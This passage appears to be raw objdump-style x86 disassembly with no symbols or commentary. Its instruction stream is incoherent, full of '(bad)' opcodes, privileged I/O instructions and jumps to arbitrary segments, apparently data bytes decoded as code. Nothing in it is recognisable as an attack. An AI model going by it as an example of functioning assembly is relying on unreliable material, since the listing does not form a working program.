  411fd1:	mov    bh,0x39
  411fd3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411fd4:	iret   
  411fd5:	xor    al,0x19
  411fd7:	pop    edi
  411fd8:	(bad)  
  411fd9:	xchg   ebx,eax
  411fda:	add    esp,DWORD PTR [esi]
  411fdc:	cwde   
  411fdd:	xchg   edx,eax
  411fde:	ja     0x411ffa
  411fe0:	pusha  
  411fe1:	inc    esi
  411fe2:	mov    bh,BYTE PTR [esi]
  411fe4:	adc    BYTE PTR [eax+0x64d9ac67],dh
  411fea:	mov    WORD PTR [eax+0x26],es
  411fed:	push   eax
  411fee:	sahf   
  411fef:	pop    ss
  411ff0:	sub    ah,BYTE PTR [ecx]
  411ff2:	mov    eax,ds:0x9ee44c90
  411ff7:	retf   
  411ff8:	jg     0x41200e
  411ffa:	cmc    
  411ffb:	pushf  
  411ffc:	aad    0xa6
  411ffe:	je     0x411fb2
  412000:	in     al,0x9d
  412002:	arpl   si,bx
  412004:	ret    
  412005:	in     al,0x20
  412007:	icebp  
  412008:	shr    BYTE PTR [esi],0x7f
  41200b:	pop    edx
  41200c:	outs   dx,BYTE PTR ds:[esi]
  41200d:	cmp    DWORD PTR [ebp-0x3f],ecx
  412010:	mov    edi,0x106bf4e
  412015:	ret    
  412016:	mov    cl,0xf
  412018:	cmp    BYTE PTR [eax+0xe],0xd6
  41201c:	sbb    cl,BYTE PTR [eax+0x5bb382b]
  412022:	push   ecx
  412023:	cmp    al,0x71
  412025:	cmp    BYTE PTR [ebp-0x5d152476],bh
  41202b:	pop    edx
  41202c:	(bad)  
  41202d:	cmc    
  41202e:	push   ecx
  41202f:	fwait
  412030:	stos   BYTE PTR es:[edi],al
  412031:	cli    
  412032:	sbb    al,ah
  412034:	ficomp WORD PTR [ebp+0x3d795932]
  41203a:	outs   dx,DWORD PTR ds:[esi]
  41203b:	fmulp  st(4),st
  41203d:	gs inc eax
  41203f:	add    ah,dh
  412041:	outs   dx,BYTE PTR ds:[esi]
  412042:	sar    BYTE PTR [si+0x5d9],0x6b
  412048:	adc    BYTE PTR [esp+edi*1+0x24],al
  41204c:	aaa    
  41204d:	pop    edi
  41204e:	shr    BYTE PTR [eax],0x6f
  412051:	add    sp,cx
  412054:	jno    0x412061
  412056:	ss ret 
  412058:	sub    eax,0x8a242e4f
  41205d:	(bad)  
  41205e:	or     al,0xdb
  412060:	pop    es
  412061:	mov    eax,0xe3e08c55
  412066:	jns    0x411ffe
  412068:	push   ebx
  412069:	addr16 in al,dx
  41206b:	inc    eax
  41206c:	daa    
  41206d:	icebp  
  41206e:	pop    ss
  41206f:	push   0x612e827a
  412074:	add    esi,edx
  412076:	mov    cl,0xd3
  412078:	call   0x8efe:0xf6305289
  41207f:	cmp    eax,0xbd469727
  412084:	sub    eax,0x51033f71
  412089:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41208a:	xor    dl,BYTE PTR [eax-0x1e98af85]
  412090:	cmp    ch,ah
  412092:	into   
  412093:	pop    eax
  412094:	bound  esi,QWORD PTR [ebp-0x7e3655bb]
  41209a:	cli    
  41209b:	adc    bh,BYTE PTR [edx+0x25]
  41209e:	and    ah,BYTE PTR [esi-0x17]
  4120a1:	mov    cs,WORD PTR [edi-0x17]
  4120a4:	lods   eax,DWORD PTR ds:[esi]
  4120a5:	fisub  WORD PTR [eax]
  4120a7:	(bad)  
  4120a8:	add    al,BYTE PTR [eax]
  4120aa:	out    dx,al
  4120ab:	fwait
  4120ac:	dec    edx
  4120ad:	xchg   ebp,eax
  4120ae:	mov    al,ds:0x9487e5d0
  4120b3:	mov    eax,ds:0xc487ba06
  4120b8:	mov    bh,0xe6
  4120ba:	sub    eax,0x5508ce9a
  4120bf:	mov    bh,0xac
  4120c1:	sti    
  4120c2:	push   ecx
  4120c3:	adc    BYTE PTR [edi],al
  4120c5:	fsub   QWORD PTR [edi-0x68ee6281]
  4120cb:	lods   al,BYTE PTR ds:[esi]
  4120cc:	pop    esp
  4120cd:	js     0x4120ca
  4120cf:	push   0xe31b3635
  4120d4:	in     al,dx
  4120d5:	mov    ecx,edi
  4120d7:	ins    BYTE PTR es:[edi],dx
  4120d8:	addr16 sahf 
  4120da:	cld    
  4120db:	retf   0x2218
  4120de:	aam    0xf7
  4120e0:	(bad)  
  4120e1:	in     eax,dx
  4120e2:	(bad)  
  4120e4:	xchg   DWORD PTR [ebp+eiz*2+0x25cd2bed],ebx
  4120eb:	nop
  4120ec:	mov    ds:0x5cb7903e,eax
  4120f1:	mov    ds:0xa61fa7c7,al
  4120f6:	ins    DWORD PTR es:[edi],dx
  4120f7:	fprem  
  4120f9:	xchg   esp,eax
  4120fa:	mov    ?,WORD PTR [esi]
  4120fc:	dec    ecx
  4120fd:	outs   dx,BYTE PTR ds:[esi]
  4120fe:	adc    al,0x44
  412100:	inc    eax
  412101:	push   edx
  412102:	idiv   DWORD PTR [edx+0x4a01eedf]
  412108:	outs   dx,BYTE PTR ds:[esi]
  412109:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41210a:	je     0x412171
  41210c:	push   esi
  41210d:	mov    edx,DWORD PTR [ecx]
  41210f:	sub    DWORD PTR [edx],ebp
  412111:	rcl    BYTE PTR [eax-0x3a],cl
  412114:	push   eax
  412115:	jecxz  0x4120a9
  412117:	jp     0x412175
  412119:	xlat   BYTE PTR gs:[ebx]
  41211b:	pop    esi
  41211c:	pushw  0xc480
  412120:	push   esi
  412121:	add    eax,0x2574a136
  412126:	sahf   
  412127:	in     al,dx
  412128:	cmp    eax,0xfb7ba263
  41212d:	aas    
  41212e:	test   eax,0xcd939f4e
  412133:	push   esp
  412134:	and    BYTE PTR [ecx+0xb8be89b],ch
  41213a:	mov    BYTE PTR [eax-0xd],ah
  41213d:	sub    DWORD PTR [ebx-0x1d],0xffffffb7
  412141:	in     al,0x18
  412143:	shl    DWORD PTR [edi+0x33],cl
  412146:	hlt    
  412147:	je     0x4120cc
  412149:	rcl    DWORD PTR [eax],1
  41214b:	and    DWORD PTR [esi],0x1bed6bef
  412151:	in     eax,0xcd
  412153:	sbb    BYTE PTR [ebp-0x7f182fcd],cl
  412159:	jge    0x41212a
  41215b:	dec    ecx
  41215c:	daa    
  41215d:	mov    eax,ds:0xfab14d1f
  412162:	mov    dl,0xc6
  412164:	outs   dx,DWORD PTR ds:[esi]
  412165:	jnp    0x41215e
  412167:	imul   DWORD PTR [ecx+0x5f2888b9]
  41216d:	daa    
  41216e:	xor    edi,DWORD PTR [esi+edx*8-0x7f2d6de3]
  412175:	add    ah,BYTE PTR [edi+0x1e]
  412178:	add    cl,BYTE PTR [edx]
  41217a:	xchg   BYTE PTR [eax+0x3c],ch
  41217d:	pop    es
  41217e:	hlt    
  41217f:	lahf   
  412180:	fmulp  st(1),st
  412182:	ins    DWORD PTR es:[edi],dx
  412183:	cmc    
  412184:	pop    ebp
  412185:	mov    DWORD PTR [ecx],esp
  412187:	and    DWORD PTR [eax+0x9],ebp
  41218a:	paddb  mm7,QWORD PTR [edx+0x607ee50c]
  412191:	adc    dh,ah
  412193:	sub    eax,0x41497ab8
  412198:	stos   DWORD PTR es:[edi],eax
  412199:	pushf  
  41219a:	adc    BYTE PTR [edx],ch
  41219c:	mov    cl,BYTE PTR [eax-0x6190157d]
  4121a2:	fist   DWORD PTR [ebx]
  4121a4:	clc    
  4121a5:	add    BYTE PTR [eax-0x5a],ch
  4121a8:	cld    
  4121a9:	out    0x6e,eax
  4121ab:	mov    ds:0x113f6b2d,al
  4121b0:	push   edi
  4121b1:	jno    0x4121eb
  4121b3:	push   edi
  4121b4:	les    eax,FWORD PTR [ebp-0x71]
  4121b7:	jbe    0x412213
  4121b9:	bound  edx,QWORD PTR [edx+0x10]
  4121bc:	mov    edx,0xa855b435
  4121c1:	pop    ds
  4121c2:	xchg   edi,eax
  4121c3:	pop    esi
  4121c4:	jecxz  0x4121f2
  4121c6:	push   ebp
  4121c7:	jne    0x41216b
  4121c9:	xor    esp,DWORD PTR [esp+eax*4-0x404b361a]
  4121d0:	scas   al,BYTE PTR es:[edi]
  4121d1:	adc    dh,BYTE PTR [edi-0x70]
  4121d4:	jno    0x41216f
  4121d6:	jne    0x412178
  4121d8:	pusha  
  4121d9:	push   0xffffffdc
  4121db:	jle    0x41225c
  4121dd:	enter  0x435c,0xd9
  4121e1:	cmp    esp,DWORD PTR [edx-0x68]
  4121e4:	lds    ecx,FWORD PTR [edx-0x7d6ec346]
  4121ea:	dec    esi
  4121eb:	retf   
  4121ec:	add    DWORD PTR [ebx+0x4b],ecx
  4121ef:	adc    BYTE PTR ds:0xef3fb2e1,al
  4121f5:	(bad)  
  4121f6:	inc    eax
  4121f7:	popf   
  4121f8:	and    al,0x5f
  4121fa:	mov    ah,0xc1
  4121fc:	ja     0x412226
  4121fe:	sub    BYTE PTR [eax],cl
  412200:	lahf   
  412201:	outs   dx,DWORD PTR ds:[esi]
  412202:	inc    edi
  412203:	std    
  412204:	fst    QWORD PTR [esi+0x72b76d]
  41220a:	sahf   
  41220b:	aas    
  41220c:	push   esi
  41220d:	in     al,0x8f
  41220f:	in     eax,0x2a
  412211:	jnp    0x4121cf
  412213:	adc    ecx,esi
  412215:	dec    eax
  412216:	xchg   cl,bh
  412218:	daa    
  412219:	fnstcw WORD PTR [edi+0x18bab635]
  41221f:	test   BYTE PTR [esi+0x7c0297d],bl
  412225:	out    dx,eax
  412226:	fwait
  412227:	out    dx,eax
  412228:	ds sub dh,bh
  41222b:	sar    cl,1
  41222d:	call   0xfed3:0x2ecdf57b
  412234:	ds add edx,eax
  412237:	mov    dl,BYTE PTR [ecx-0x58c80417]
  41223d:	adc    eax,0x47ba9b8f
  412242:	test   DWORD PTR [ebx+0x5],0xbcaaca86
  412249:	xor    DWORD PTR [ebp-0x6d],0xfffffff9
  41224d:	adc    eax,0x38a98717
  412252:	push   edx
  412253:	xor    esp,edx
  412255:	or     DWORD PTR [edi],esp
  412257:	push   ecx
  412258:	dec    eax
  412259:	jg     0x412261
  41225b:	push   ebp
  41225c:	das    
  41225d:	xchg   ecx,eax
  41225e:	cmp    BYTE PTR [ebx+ebp*4],bh
  412261:	test   al,0xf5
  412263:	xor    ebx,edi
  412265:	call   0xbe15b958
  41226a:	rcl    BYTE PTR [eax+esi*8-0x54],1
  41226e:	cmc    
  41226f:	or     BYTE PTR [ebx+ebp*2+0x7c18ab8b],cl
  412276:	sub    edx,DWORD PTR [esi+0x46613ee1]
  41227c:	pusha  
  41227d:	dec    esi
  41227e:	das    
  41227f:	adc    BYTE PTR [edi+ebp*1+0x49443ae1],ch
  412286:	mov    esi,ds
  412288:	adc    ch,dh
  41228a:	cmc    
  41228b:	mov    dh,0x31
  41228d:	leave  
  41228e:	sub    DWORD PTR ds:0x57ef4590,ebx
  412294:	sbb    DWORD PTR [eax],ebx
  412296:	fnstsw WORD PTR ds:0x11daafc0
  41229c:	fsubr  QWORD PTR [ebx]
  41229e:	arpl   WORD PTR [eax-0x264d8d31],si
  4122a4:	jne    0x412296
  4122a6:	jbe    0x412280
  4122a8:	repz mov dh,0x4d
  4122ab:	imul   ecx,esi,0xffffffe0
  4122ae:	cwde   
  4122af:	mov    eax,ds:0x78873500
  4122b4:	jnp    0x412324
  4122b6:	test   BYTE PTR [edi],0xb
  4122b9:	jo     0x412339
  4122bb:	nop
  4122bc:	jmp    0x9b2a:0x2fd70411
  4122c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4122c4:	xor    DWORD PTR [ebx],eax
  4122c6:	jnp    0x41229c
  4122c8:	xor    DWORD PTR [edx+edi*1-0x36e28017],esi
  4122cf:	fnstsw WORD PTR [eax+edi*4-0x33]
  4122d3:	cmp    BYTE PTR [ecx-0x1f],cl
  4122d6:	stos   BYTE PTR es:[edi],al
  4122d7:	imul   ebp,DWORD PTR [ebx],0x26ae39c7
  4122dd:	mov    ch,bl
  4122df:	cli    
  4122e0:	push   eax
  4122e1:	ret    0xdb94
  4122e4:	xchg   esi,eax
  4122e5:	dec    edi
  4122e6:	cwd    
  4122e8:	xchg   DWORD PTR [edx+0x37],ecx
  4122eb:	dec    eax
  4122ec:	or     edx,ebx
  4122ee:	xchg   esp,eax
  4122ef:	jmp    0x2290:0xf05c506d
  4122f6:	in     al,dx
  4122f7:	xchg   ecx,eax
  4122f8:	cld    
  4122f9:	fxch   st(5)
  4122fb:	(bad)  
  4122fc:	scas   eax,DWORD PTR es:[edi]
  4122fd:	repnz (bad)
  412300:	inc    edi
  412301:	icebp  
  412302:	sbb    DWORD PTR [edi+0x5fbb2e26],ecx
  412308:	test   eax,0xd0786286
  41230d:	popa   
  41230e:	add    ebx,DWORD PTR [ecx]
  412310:	xchg   ebp,eax
  412311:	ret    0xe334
  412314:	pop    ecx
  412315:	repz add BYTE PTR [ebp-0x1b],dh
  412319:	pop    ebp
  41231a:	xlat   BYTE PTR ds:[ebx]
  41231b:	iret   
  41231c:	add    eax,0x26bfd1e3
  412321:	mov    WORD PTR [esi-0x5e15338c],?
  412327:	dec    ebx
  412328:	mov    ds:0xfda4fa6c,al
  41232d:	dec    ecx
  41232e:	jne    0x4123a7
  412330:	mov    WORD PTR [ecx+0x1d107931],es
  412336:	in     al,dx
  412337:	outs   dx,DWORD PTR ds:[esi]
  412338:	call   0x754b:0xff051297
  41233f:	ret    0xc75e
  412342:	arpl   WORD PTR [ebx-0xee800cb],bx
  412348:	inc    ebp
  412349:	xlat   BYTE PTR ds:[ebx]
  41234a:	lods   eax,DWORD PTR ds:[esi]
  41234b:	mov    ds:0x5b16c9dd,al
  412350:	in     eax,dx
  412351:	pop    edx
  412352:	inc    ecx
  412353:	sub    esp,DWORD PTR [edi]
  412355:	stos   DWORD PTR es:[edi],eax
  412356:	loopne 0x4123b7
  412358:	pop    ss
  412359:	cmp    BYTE PTR [edi+0x2a],dl
  41235c:	or     esp,DWORD PTR [ebx]
  41235e:	or     eax,0x55037f06
  412363:	jecxz  0x41237b
  412365:	mov    ah,0x45
  412367:	jne    0x41230c
  412369:	xchg   ebp,eax
  41236a:	dec    eax
  41236b:	add    DWORD PTR [edi-0x1dc208e6],edx
  412371:	push   esp
  412372:	mov    bl,BYTE PTR [bp+si+0x6a15]
  412377:	test   eax,0xef239c44
  41237c:	hlt    
  41237d:	addr16 in al,dx
  41237f:	dec    esp
  412380:	jnp    0x41230a
  412382:	ss push 0x1e
  412385:	cmp    al,0x57
  412387:	test   al,cl
  412389:	adc    BYTE PTR [ebp-0x12],dh
  41238c:	nop
  41238d:	lea    edi,[esi+0x47]
  412390:	jp     0x4123c5
  412392:	(bad)  
  412393:	xchg   edi,eax
  412394:	ret    0xfd60
  412397:	push   ss
  412398:	scas   eax,DWORD PTR es:[edi]
  412399:	xor    ebp,DWORD PTR [esi+0x657e3db2]
  41239f:	(bad)  
  4123a0:	data16 jne 0x41234d
  4123a3:	mov    ds:0x9992a5a1,al
  4123a8:	aad    0xfd
  4123aa:	xchg   edi,eax
  4123ab:	adc    al,0x88
  4123ad:	xor    DWORD PTR [eax+ebp*4],eax
  4123b0:	push   ss
  4123b1:	mov    al,0x40
  4123b3:	sub    esp,edi
  4123b5:	push   ebp
  4123b6:	aam    0xad
  4123b8:	test   al,0xf4
  4123ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4123bb:	stos   DWORD PTR es:[edi],eax
  4123bc:	not    esi
  4123be:	aas    
  4123bf:	and    BYTE PTR [eax+0x20ddcabf],al
  4123c5:	sub    bl,ch
  4123c7:	and    esp,DWORD PTR [edi]
  4123c9:	test   eax,0xd40f367f
  4123ce:	push   edi
  4123cf:	pop    ecx
  4123d0:	loop   0x41243c
  4123d2:	jns    0x4123be
  4123d4:	out    dx,al
  4123d5:	gs pop es
  4123d7:	jb     0x41238c
  4123d9:	adc    BYTE PTR [eax],bl
  4123db:	scas   al,BYTE PTR es:[edi]
  4123dc:	js     0x412441
  4123de:	xor    bl,BYTE PTR [edi+0x6f29b8e1]
  4123e4:	inc    esi
  4123e5:	push   ebx
  4123e6:	jb     0x412459
  4123e8:	retf   
  4123e9:	ins    BYTE PTR es:[edi],dx
  4123ea:	div    DWORD PTR [edi+0x40f34532]
  4123f0:	sti    
  4123f1:	push   edi
  4123f2:	ds int3 
  4123f4:	sub    DWORD PTR [edx],0xa9bc92fd
  4123fa:	and    al,0x5e
  4123fc:	adc    al,0xdc
  4123fe:	enter  0xff8,0x2f
  412402:	ret    0x1fd3
  412405:	iret   
  412406:	mov    esp,fs
  412408:	mov    dl,0x1
  41240a:	clc    
  41240b:	ret    
  41240c:	pop    ds
  41240d:	mov    dl,BYTE PTR ds:0xaa830395
  412413:	push   ebp
  412414:	sub    eax,DWORD PTR [ebx]
  412416:	xchg   BYTE PTR [edx-0x5a8c053a],bl
  41241c:	sbb    DWORD PTR [edi],eax
  41241e:	xchg   esi,eax
  41241f:	add    BYTE PTR [edi+0x76],ch
  412422:	(bad)  
  412424:	mov    al,0x9a
  412426:	in     eax,0xee
  412428:	inc    esp
  412429:	sti    
  41242a:	popf   
  41242b:	arpl   WORD PTR [esi-0x60],ax
  41242e:	pop    edx
  41242f:	jbe    0x4124a0
  412431:	or     BYTE PTR [edx],dh
  412433:	jecxz  0x41246d
  412435:	cmp    eax,DWORD PTR [eax-0x40ba3924]
  41243b:	out    0xa5,eax
  41243d:	jmp    0x2d46:0x2f5c99bd
  412444:	cmp    al,0xac
  412446:	push   esi
  412447:	retf   
  412448:	mov    eax,0x54ca9e35
  41244d:	mov    eax,ds:0x56ab4879
  412452:	repnz mov eax,ds:0x88263aef
  412458:	or     bl,BYTE PTR [esp+ebp*2-0x776d8825]
  41245f:	out    dx,al
  412460:	ss loope 0x4124bc
  412463:	pop    es
  412464:	int    0xd
  412466:	ins    BYTE PTR es:[edi],dx
  412467:	retf   0x3d52
  41246a:	or     dh,0x4f
  41246d:	sub    eax,0x48f97227
  412472:	out    0x2a,al
  412474:	inc    ebx
  412475:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412476:	cmp    BYTE PTR [ebx],bh
  412478:	enter  0xaa2,0x45
  41247c:	jnp    0x4124cb
  41247e:	addr16 dec edi
  412480:	cmp    BYTE PTR [ebx-0x5818bc3c],al
  412486:	pop    es
  412487:	les    esp,FWORD PTR [edi+0x70]
  41248a:	js     0x46685054
  412490:	mov    bh,0x41
  412492:	add    edi,eax
  412494:	xor    BYTE PTR [ebx+0x4dd31f7b],ah
  41249a:	inc    eax
  41249b:	in     eax,0x8f
  41249d:	icebp  
  41249e:	out    dx,al
  41249f:	add    esp,esp
  4124a1:	pop    esi
  4124a2:	mov    dh,0xc5
  4124a4:	popa   
  4124a5:	sbb    dl,ch
  4124a7:	or     edx,ecx
  4124a9:	and    bl,BYTE PTR [ecx]
  4124ab:	inc    ebx
  4124ac:	rcr    eax,cl
  4124ae:	adc    al,0x65
  4124b1:	test   al,0x1c
  4124b3:	inc    eax
  4124b4:	mov    ecx,0xfba835af
  4124b9:	pop    ecx
  4124ba:	sbb    ecx,DWORD PTR [esp+ebx*4]
  4124bd:	fs out dx,eax
  4124bf:	add    ebp,esi
  4124c1:	jge    0x412475
  4124c3:	(bad)  
  4124c4:	lock add eax,0xa916c8a4
  4124ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4124cb:	je     0x4124aa
  4124cd:	mov    al,0x65
  4124cf:	cli    
  4124d0:	sbb    DWORD PTR [esi+0x4],esp
  4124d3:	fldcw  WORD PTR [eax-0x1985975e]
  4124d9:	mov    bl,0x8b
  4124db:	jl     0x4124b7
  4124dd:	hlt    
  4124de:	sbb    ecx,ecx
  4124e0:	out    0x7b,al
  4124e2:	mov    al,ds:0x6236a53e
  4124e7:	jbe    0x4124ad
  4124e9:	ins    DWORD PTR es:[edi],dx
  4124ea:	call   0x952d54ce
  4124ef:	push   es
  4124f0:	mov    bh,0xd5
  4124f2:	sub    bl,ch
  4124f4:	pop    eax
  4124f5:	push   0x9dd6b4a9
  4124fa:	fwait
  4124fb:	and    edx,DWORD PTR [ebx+0x40f69aae]
  412501:	pop    ecx
  412502:	sub    DWORD PTR [esi+edx*4],ebx
  412505:	push   0xe8766107
  41250a:	rol    BYTE PTR [ebp-0x44],1
  41250d:	sub    al,0x4d
  41250f:	fidivr WORD PTR ds:0xe3bcf450
  412515:	mov    bl,0xa8
  412517:	inc    BYTE PTR [esi+0x6a67431c]
  41251d:	fild   DWORD PTR [eax-0x405f6706]
  412523:	adc    dh,BYTE PTR [edi-0x77]
  412526:	cs jmp 0x7382519e
  41252c:	int    0x5a
  41252e:	popf   
  41252f:	and    ebx,ebx
  412531:	enter  0x2b7,0xd0
  412535:	in     al,dx
  412536:	sbb    eax,0x3e7fdc83
  41253b:	xchg   DWORD PTR [eax+0x21831e0],edx
  412541:	xchg   esi,eax
  412542:	inc    esp
  412543:	pusha  
  412544:	cdq    
  412545:	pop    esi
  412546:	fist   WORD PTR [edx]
  412548:	cld    
  412549:	sar    DWORD PTR [ecx-0x71],cl
  41254c:	int    0x35
  41254e:	push   edx
  41254f:	test   DWORD PTR [ecx+0x1ee7cc46],edi
  412555:	mov    al,ds:0x51ba9a3
  41255a:	sub    DWORD PTR [edi+ebp*2+0x7733cc9a],ebp
  412561:	xor    al,BYTE PTR [ebx-0x35e8990e]
  412567:	push   edx
  412568:	xchg   ebx,eax
  412569:	mov    eax,0x3a255abb
  41256e:	inc    edi
  41256f:	es pop edx
  412571:	daa    
  412572:	jmp    0x412579
  412574:	bound  ecx,QWORD PTR [edi+0x77be265e]
  41257a:	leavew 
  41257c:	jle    0x41252a
  41257e:	mov    ebp,?
  412580:	jmp    0xb2ed:0xe5dc311f
  412587:	int    0x73
  412589:	arpl   WORD PTR [edi-0x37],sp
  41258c:	pop    es
  41258d:	js     0x4125c3
  41258f:	add    eax,ebp
  412591:	xlat   BYTE PTR ds:[ebx]
  412592:	or     ebx,ebp
  412594:	out    dx,eax
  412595:	push   cs
  412596:	inc    esp
  412597:	cdq    
  412598:	jno    0x412602
  41259a:	das    
  41259b:	mov    bl,0xd
  41259d:	das    
  41259e:	mov    ah,0x92
  4125a0:	imul   esi,DWORD PTR [edi-0x10],0xffffffcc
  4125a4:	add    al,0x8f
  4125a6:	int3   
  4125a7:	pop    es
  4125a8:	push   ss
  4125a9:	mov    bh,0xfe
  4125ab:	pop    ebp
  4125ac:	and    DWORD PTR [eax],0xf93ca9ad
  4125b2:	les    esi,FWORD PTR [ebx-0xe743948]
  4125b8:	(bad)  
  4125ba:	sti    
  4125bb:	jmp    0x4125f6
  4125bd:	retf   0xa363
  4125c0:	lea    edx,[eax+0x63f48a59]
  4125c6:	ins    DWORD PTR es:[edi],dx
  4125c7:	or     ebx,eax
  4125c9:	push   ebp
  4125ca:	add    al,0xf
  4125cc:	sub    BYTE PTR [edx+0x15ca5222],bl
  4125d2:	sub    edi,ebp
  4125d4:	mov    al,ds:0xa8479b81
  4125d9:	dec    esi
  4125da:	dec    eax
  4125db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4125dc:	jge    0x4125c1
  4125de:	push   0x2cddfbc8
  4125e3:	in     eax,dx
  4125e4:	test   BYTE PTR [ecx+0x31],0x9a
  4125e8:	fisttp WORD PTR [ebx]
  4125ea:	(bad)  
  4125eb:	sub    DWORD PTR [esi-0x4d7ca46b],ebx
  4125f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4125f2:	aam    0x59
  4125f4:	outs   dx,DWORD PTR ds:[esi]
  4125f5:	sbb    bl,BYTE PTR [edx]
  4125f7:	jbe    0x412584
  4125f9:	in     al,dx
  4125fa:	dec    eax
  4125fb:	or     BYTE PTR ds:0xf29a54cf,cl
  412601:	neg    esp
  412603:	add    edi,DWORD PTR [edi+edx*8-0x4786896f]
  41260a:	(bad)  
  41260b:	sbb    ebp,ebp
  41260d:	push   ebp
  41260e:	adc    DWORD PTR [esi-0x5de59cef],ebx
  412614:	jmp    0x41268d
  412616:	sbb    BYTE PTR [esi],dl
  412618:	cld    
  412619:	mov    ch,0xf6
  41261b:	push   ds
  41261c:	out    dx,al
  41261d:	and    DWORD PTR [edx-0x1e8cb62f],esp
  412623:	(bad)  
  412625:	fnsave [edi]
  412627:	cmp    bh,dl
  412629:	pop    ebp
  41262a:	push   cs
  41262b:	inc    eax
  41262c:	loope  0x4125b5
  41262e:	pop    es
  41262f:	pusha  
  412630:	mov    WORD PTR [edi-0x496c8fad],ds
  412636:	push   0x31
  412638:	mov    bh,0xa7
  41263a:	mov    BYTE PTR [edi+0x190ca654],0x68
  412641:	mov    ebp,0x9c6f0b60
  412646:	ficomp DWORD PTR [edi+0x50f31e42]
  41264c:	(bad)
  412650:	and    ecx,esi
  412652:	push   cs
  412653:	inc    ebx
  412654:	xchg   ebx,eax
  412655:	cmp    ah,BYTE PTR [edx+0x5f]
  412658:	in     al,0x58
  41265a:	mov    ecx,0x62da55b3
  41265f:	push   es
  412660:	dec    ebx
  412661:	sbb    BYTE PTR [edx+0x36],cl
  412664:	popa   
  412665:	ins    BYTE PTR es:[edi],dx
  412666:	jns    0x412679
  412668:	fisttp WORD PTR [edi]
  41266a:	ins    DWORD PTR es:[edi],dx
  41266b:	inc    edx
  41266c:	lahf   
  41266d:	mov    dh,0x3c
  41266f:	enter  0x44c,0xf2
  412673:	xor    DWORD PTR [ebp-0x11c4645a],0xeea7aed8
  41267d:	icebp  
  41267e:	inc    ebp
  41267f:	sbb    bl,bh
  412681:	dec    edi
  412682:	mov    esp,0x56b0aa37
  412687:	shl    al,0x29
  41268a:	xor    DWORD PTR [edi-0x38],ebp
  41268d:	cmc    
  41268e:	lods   eax,DWORD PTR ds:[esi]
  41268f:	pop    ebp
  412690:	setge  bl
  412693:	xchg   ebx,eax
  412694:	jns    0x4126ce
  412696:	outs   dx,BYTE PTR ds:[esi]
  412697:	dec    esp
  412698:	xchg   BYTE PTR [ebx+0x694b2f1d],cl
  41269e:	(bad)  
  41269f:	and    BYTE PTR [edi-0x616495d6],bl
  4126a5:	repz pop esp
  4126a7:	push   esp
  4126a8:	jno    0x4126b5
  4126aa:	test   eax,0x96d9140a
  4126af:	push   ds
  4126b0:	push   esi
  4126b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4126b2:	fsubr  QWORD PTR [ebx+0x2ce7936a]
  4126b8:	mov    esp,DWORD PTR [eax]
  4126ba:	xor    bh,bl
  4126bc:	sub    esi,DWORD PTR [ebx]
  4126be:	mul    DWORD PTR [ecx]
  4126c0:	xor    ebx,DWORD PTR [edi-0x71]
  4126c3:	inc    esi
  4126c4:	mov    edx,0x3b1150dd
  4126c9:	cwde   
  4126ca:	pusha  
  4126cb:	xor    eax,DWORD PTR [edi-0x799b4565]
  4126d1:	into   
  4126d2:	aas    
  4126d3:	xchg   ebp,eax
  4126d4:	pop    edi
  4126d5:	loop   0x41268b
  4126d7:	sub    al,0xaa
  4126d9:	mov    ds:0xfac60cab,al
  4126de:	leave  
  4126df:	in     al,dx
  4126e0:	sbb    al,BYTE PTR [ecx-0x256d95f]
  4126e6:	cmp    ebx,ebx
  4126e8:	neg    DWORD PTR fs:[ebx]
  4126eb:	mov    eax,0x75cfe5aa
  4126f0:	push   cs
  4126f1:	push   edi
  4126f2:	pushf  
  4126f3:	or     eax,0x6ad564b5
  4126f8:	add    DWORD PTR [esi],ebx
  4126fa:	cmp    DWORD PTR [ecx+0x7aa524cc],edx
  412700:	cdq    
  412701:	mov    ebx,0x91444b68
  412706:	inc    ecx
  412707:	out    dx,al
  412708:	sub    DWORD PTR [ecx],ebx
  41270a:	inc    edx
  41270b:	jl     0x4126f0
  41270d:	mov    ah,0xc6
  41270f:	aaa    
  412710:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412711:	fcom   QWORD PTR [esi]
  412713:	mov    esp,DWORD PTR [ecx-0x765a35f]
  412719:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41271b:	push   edx
  41271c:	into   
  41271d:	jno    0x41275e
  41271f:	and    BYTE PTR [esi+0x3b],dl
  412722:	js     0x4126ff
  412724:	sub    BYTE PTR [eax+0x2c958d58],ah
  41272a:	inc    ebx
  41272b:	(bad)  
  41272c:	fstp   QWORD PTR [ebp+edx*4+0x49d3ab70]
  412733:	or     BYTE PTR [edi],ch
  412735:	ret    
  412736:	adc    DWORD PTR [edi],esi
  412738:	inc    esi
  412739:	pop    esi
  41273a:	shl    DWORD PTR [ebx],1
  41273c:	xchg   edx,eax
  41273d:	std    
  41273e:	scas   al,BYTE PTR es:[edi]
  41273f:	push   ecx
  412740:	out    0xd6,al
  412742:	nop
  412743:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412744:	nop
  412745:	fisttp DWORD PTR [eax]
  412747:	leave  
  412748:	aam    0x5
  41274a:	pop    ebp
  41274b:	jne    0x412746
  41274d:	xchg   edi,eax
  41274e:	adc    DWORD PTR [eax+0x44],esi
  412751:	sbb    al,0x9c
  412753:	(bad)  
  412754:	rol    BYTE PTR [ecx-0x5c5b32a3],1
  41275a:	daa    
  41275b:	jns    0x412710
  41275d:	rcl    ch,cl
  41275f:	lea    edx,[ebp+0x74b022e6]
  412765:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412766:	pop    edi
  412767:	or     ebp,DWORD PTR [eax-0x2f592525]
  41276d:	ss popf 
  41276f:	aam    0x74
  412771:	sar    BYTE PTR [ecx],1
  412773:	mov    bl,0xe9
  412775:	cld    
  412776:	mov    ds:0x2db5fee0,al
  41277b:	jmp    0x70:0x36c4fa22
  412782:	shl    DWORD PTR [ebx-0x2fbdb07a],1
  412788:	inc    edx
  412789:	xchg   esi,eax
